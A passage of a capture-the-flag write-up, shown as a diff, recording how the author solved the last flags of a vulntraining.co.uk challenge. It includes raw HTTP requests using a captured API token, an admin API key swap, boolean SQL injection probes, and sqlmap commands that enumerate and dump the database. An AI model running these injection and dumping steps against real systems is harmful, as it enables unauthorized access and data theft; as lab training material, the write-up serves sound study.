@@ -212,3 +212,228 @@ Notes are good, I've not mentioned FUZZ on billing.vulntraining.co.uk let's try 
 - /4 - known
 - /login - known
 - /logout - known
+
+OK well I can be confident I've done enough path fuzzing now on all domains. So I need to be authorised to access these API endpoints
+
+After trying a number of 401/403 bypasses on hacktrickz I decided to try out fuzzing parameters on the API directly.
+
+For example /admin?FUZZ=x
+
+Still getting 401 responses though....
+
+So back to billing to check for any hidden query params in the path. I get a weird hit with ?api=x
+
+```html
+<h1>API Error</h1>
+```
+
+API? As a query parameter name? How ambiguous is that? Right ok so I have to work what sort of value this would accept. TBH a query parameter in this location surprised me, there clearly seems to be some separation between the front end and API layer so it's just luck I picked up on this....
+
+Tried the supplied wordlist for values and nothing.....
+
+Could it be referencing the name of the API or the URL to the API it uses? Tried the following
+
+- /invoices - API Error
+- /admin - API Error
+- /admin/users - API Error
+- admin.vulntraining.co.uk - API Error
+- http://admin.vulntraining.co.uk - API Error
+
+One last thing to try was to fire up my collab client grab the host/domain and try that. And I get a hit! Flag no.9 and a token for the API
+
+./![alt](./images/vulntraining-14.png)
+
+As someone who has developed a lot of API's over the years I'm horrified if this was a true scenario, why oh why would you allow the base URL to an API be configurable on user input in the browser like this! This was a tricky flag to find
+
+Anyway.... I can use the token now, back to those end points we found before.
+
+Using the token in the request eg.
+
+```
+GET /admin/users/5 HTTP/1.1
+Host: admin.vulntraining.co.uk
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Token: xxx
+Connection: close
+Cookie: ctfchallenge=xxx
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+```
+
+I get a response back with a flag (no. 10)
+
+```
+HTTP/1.1 200 OK
+server: nginx/1.21.1
+date: Fri, 10 Jun 2022 21:54:46 GMT
+content-type: application/json
+set-cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTBkalJsY1hsa2VDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiIyYzE2MGJkOWI0ZDBkYmE5NDRjYjM5MGVjMDcwYWZhYiJ9; Max-Age=2592000; Path=/; domain=.vulntraining.co.uk
+connection: close
+Content-Length: 148
+
+{"id":5,"username":"jon.helmstead","flag":"[^FLAG^xxx^FLAG^]","apikey":"xxxx","admin":true}
+```
+
+Looks like Jon is an admin with a different API key, lets quickly switch to using his API key instead. And I find this
+
+Request
+```
+GET /admin HTTP/1.1
+Host: admin.vulntraining.co.uk
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Token: xxxx
+Connection: close
+Cookie: ctfchallenge=xxx
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+```
+
+Response
+```
+HTTP/1.1 200 OK
+server: nginx/1.21.1
+date: Fri, 10 Jun 2022 21:58:33 GMT
+content-type: application/json
+set-cookie: ctfchallenge=xxx; Max-Age=2592000; Path=/; domain=.vulntraining.co.uk
+connection: close
+Content-Length: 59
+
+{"endpoints":["\/admin\/users","\/admin\/s3cr3t_m3ss4g3s"]}
+```
+
+A new endpoint not seen with fuzzing
+
+```
+HTTP/1.1 200 OK
+server: nginx/1.21.1
+date: Fri, 10 Jun 2022 22:01:13 GMT
+content-type: application/json
+set-cookie: ctfchallenge=xxx; Max-Age=2592000; Path=/; domain=.vulntraining.co.uk
+connection: close
+Content-Length: 51
+
+[{"id":"2","link":"\/admin\/s3cr3t_m3ss4g3s?id=2"}]
+```
+
+OK looks like a single message, let's have a look
+
+```
+HTTP/1.1 200 OK
+server: nginx/1.21.1
+date: Fri, 10 Jun 2022 22:02:24 GMT
+content-type: application/json
+set-cookie: ctfchallenge=xxx; Max-Age=2592000; Path=/; domain=.vulntraining.co.uk
+connection: close
+Content-Length: 57
+
+{"id":"2","message":"Hey, did you get my other message?"}
+```
+
+OK a message with ID 2 let's tweak the request to see if 1 is still there
+
+```
+HTTP/1.1 423 Locked
+server: nginx/1.21.1
+date: Fri, 10 Jun 2022 22:03:04 GMT
+content-type: application/json
+set-cookie: ctfchallenge=xxx; Max-Age=2592000; Path=/; domain=.vulntraining.co.uk
+connection: close
+Content-Length: 22
+
+["Message is deleted"]
+```
+
+Nope...
+
+Ummmm can I try SQLi maybe on the ID?
+
+Yes probably, I tried with (2 and 1=1#)
+
+```
+GET /admin/s3cr3t_m3ss4g3s?id=2%20and%201%3d1%23
+```
+
+And got 
+
+```
+{"id":"2","message":"Hey, did you get my other message?"}
+```
+
+Then tweaked it slightly to (2 and 1=2#)
+
+```
+GET /admin/s3cr3t_m3ss4g3s?id=2%20and%201%3d2%23
+```
+
+And got
+
+```
+["Message not found"]
+```
+
+OK to SQLMap, first round
+
+```
+└─$ sqlmap -u http://admin.vulntraining.co.uk/admin/s3cr3t_m3ss4g3s?id=1* --delay=0.2 --cookie='ctfchallenge=xxx' -H "X-Token: xxx"
+```
+
+SQLMap confirmed it was, so I'll try to enumerate the DB's using the same technique
+
+```
+└─$ sqlmap -u http://admin.vulntraining.co.uk/admin/s3cr3t_m3ss4g3s?id=1* --delay=0.2 --cookie='ctfchallenge=xxx' -H "X-Token: xxx" --dbs
+```
+
+Got em
+
+```
+available databases [2]:
+[*] information_schema
+[*] vulntraining_api
+```
+
+OK let's do the same thing for the tables and columns
+
+```
+└─$ sqlmap -u http://admin.vulntraining.co.uk/admin/s3cr3t_m3ss4g3s?id=1* --delay=0.2 --cookie='ctfchallenge=xxx' -H "X-Token: xxx" -D vulntraining_api --tables --columns
+```
+
+And we have
+
+```
+Database: vulntraining_api
+Table: message
+[3 columns]
++---------+------------+
+| Column  | Type       |
++---------+------------+
+| deleted | tinyint(1) |
+| id      | int        |
+| message | text       |
++---------+------------+
+```
+
+Now I know the database and the table I can dump it
+
+```
+└─$ sqlmap -u http://admin.vulntraining.co.uk/admin/s3cr3t_m3ss4g3s?id=1* --delay=0.2 --cookie='ctfchallenge=xxx' -H "X-Token: xxx" -D vulntraining_api -T message --dump
+```
+
+And I have the final flag :). Challenge complete :)
+
+```
+Database: vulntraining_api
+Table: message
+[2 entries]
++----+---------+--------------------------------------------------------------------------------------+
+| id | deleted | message                                                                              |
++----+---------+--------------------------------------------------------------------------------------+
+| 1  | 1       | Don't share this message with anyone! [^FLAG^xxx^FLAG^] |
+| 2  | 0       | Hey, did you get my other message?                                                   |
++----+---------+--------------------------------------------------------------------------------------+
+```
